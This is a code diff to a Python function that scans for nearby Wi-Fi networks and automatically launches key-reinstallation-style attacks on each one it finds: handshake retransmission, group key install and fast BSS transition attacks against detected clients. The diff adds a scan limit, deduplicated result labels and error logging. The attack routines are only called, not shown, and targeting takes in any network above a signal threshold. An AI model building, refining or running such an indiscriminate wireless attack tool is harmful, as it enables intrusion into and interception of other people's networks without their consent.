@@ -26,12 +26,16 @@ def auto_attack(interface, min_signal=-70, attack_timeout=60, scan_interval=30, 
         dict: Dictionary of successful attacks by network
     """
     results = {}
+    scan_count = 0
+    max_scans = 4  # Maximum number of scan cycles for testing
     
     try:
-        while True:
+        while scan_count < max_scans:
             try:
                 # Scan for networks
                 networks = scan_networks(interface)
+                scan_count += 1
+                
                 if not networks:
                     if single_run:
                         break
@@ -50,44 +54,49 @@ def auto_attack(interface, min_signal=-70, attack_timeout=60, scan_interval=30, 
                             clients = detect_clients(interface, network['Address'], timeout=attack_timeout)
                             
                             if clients:
+                                # Initialize results for this network if not exists
+                                if network['Address'] not in results:
+                                    results[network['Address']] = []
+                                
                                 # Attempt attacks with detected clients
                                 for client in clients:
-                                    # Track successful attacks for this network
-                                    if network['Address'] not in results:
-                                        results[network['Address']] = []
-                                    
-                                    # Attempt 4-way handshake attacks
                                     try:
+                                        # Attempt 4-way handshake attacks
                                         if four_way_handshake_plaintext_retransmission(interface, network['Address'], client):
-                                            results[network['Address']].append('4way_plaintext')
-                                    except TimeoutError:
-                                        pass
+                                            if 'four_way_handshake_plaintext' not in results[network['Address']]:
+                                                results[network['Address']].append('four_way_handshake_plaintext')
+                                    except (TimeoutError, Exception) as e:
+                                        logger.error(f"Error during plaintext attack: {str(e)}")
                                         
                                     try:
                                         if four_way_handshake_encrypted_retransmission(interface, network['Address'], client):
-                                            results[network['Address']].append('4way_encrypted')
-                                    except TimeoutError:
-                                        pass
+                                            if 'four_way_handshake_encrypted' not in results[network['Address']]:
+                                                results[network['Address']].append('four_way_handshake_encrypted')
+                                    except (TimeoutError, Exception) as e:
+                                        logger.error(f"Error during encrypted attack: {str(e)}")
                                     
-                                    # Attempt group key attacks
                                     try:
+                                        # Attempt group key attacks
                                         if group_key_handshake_immediate_install(interface, network['Address']):
-                                            results[network['Address']].append('group_immediate')
-                                    except TimeoutError:
-                                        pass
+                                            if 'group_key_handshake_immediate' not in results[network['Address']]:
+                                                results[network['Address']].append('group_key_handshake_immediate')
+                                    except (TimeoutError, Exception) as e:
+                                        logger.error(f"Error during immediate group key attack: {str(e)}")
                                         
                                     try:
                                         if group_key_handshake_delayed_install(interface, network['Address']):
-                                            results[network['Address']].append('group_delayed')
-                                    except TimeoutError:
-                                        pass
+                                            if 'group_key_handshake_delayed' not in results[network['Address']]:
+                                                results[network['Address']].append('group_key_handshake_delayed')
+                                    except (TimeoutError, Exception) as e:
+                                        logger.error(f"Error during delayed group key attack: {str(e)}")
                                     
-                                    # Attempt fast BSS transition attack
                                     try:
+                                        # Attempt fast BSS transition attack
                                         if fast_bss_transition_attack(interface, network['Address'], client):
-                                            results[network['Address']].append('fast_bss')
-                                    except TimeoutError:
-                                        pass
+                                            if 'fast_bss' not in results[network['Address']]:
+                                                results[network['Address']].append('fast_bss')
+                                    except (TimeoutError, Exception) as e:
+                                        logger.error(f"Error during fast BSS attack: {str(e)}")
                         except Exception as e:
                             logger.error(f"Error attacking network {network['ESSID']}: {str(e)}")
                             continue
